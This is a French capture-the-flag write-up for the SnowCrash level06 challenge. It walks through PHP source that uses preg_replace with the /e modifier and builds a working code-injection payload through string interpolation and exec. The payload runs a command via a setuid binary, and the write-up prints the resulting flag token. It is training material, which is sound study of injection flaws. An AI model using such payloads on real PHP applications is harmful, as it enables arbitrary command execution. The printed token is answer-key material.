Dans ce niveau il y a 2 fichiers:

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
On suppose que `level06.php` est la source de `level06`:
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
Ce qui nous interesse:
```php
#!/usr/bin/php
<?php
function y($m) {
	// $m = preg_replace("/\./", " x ", $m);
	// $m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y); // Lecture de fichier
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	// $a = preg_replace("/\[/", "(", $a);
	// $a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1]/*, $argv[2]*/);
print $r;
?>
```
Concretement on remplace le contenu du fichier pointé par `argv[1]` on remplace `[x <text>]` par `y("text")` et on l'affiche.

Dans les strings PHP `"{}"` permet d'[interpoler](https://phppot.com/php/variable-interpolation-in-php/) une variable ou une expression au sein d'une string, on va s'en servir pour injecter du code a l'aide de la fonction [`exec`](https://www.php.net/manual/en/function.exec.php).

On prepare donc la payload:
```
$> echo '[x {${exec(getflag)}}]' > /tmp/file
```
Et on l'execute:
```
./level06 /tmp/file   
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
Bon ok, ca crash, on aurait pu mieux faire la payload :woman_shrugging: :man_shrugging:  
Mais on a le flag ! :tada:
```
wiok45aaoguiboiki2tuin6ub
```
